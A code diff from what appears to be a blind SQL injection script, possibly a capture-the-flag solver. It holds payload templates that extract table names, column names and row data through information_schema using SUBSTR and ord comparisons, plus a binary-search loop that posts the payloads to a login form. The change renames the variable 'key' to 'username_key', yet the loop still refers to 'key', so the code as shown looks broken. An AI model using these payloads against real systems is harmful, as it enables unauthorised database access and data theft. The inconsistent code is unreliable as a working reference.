@@ -10,7 +10,8 @@ payload_table = 'a\' or ord( SUBSTR((select group_concat(table_name) from inform
 payload_column = 'a\' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}#'
 payload_data = 'a\' or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}#'
 
-key = "username"
+username_key = "username"
+password_key = 'password'
 
 start_time = time.time()
 
@@ -35,7 +36,7 @@ def search(index, payload):
     while low < high:
         data = {
             key: payload.format(index, mid),
-            'password': '',
+            password_key: '',
         }
         res = session.post(url, data=data)
         if flag_success in res.text:
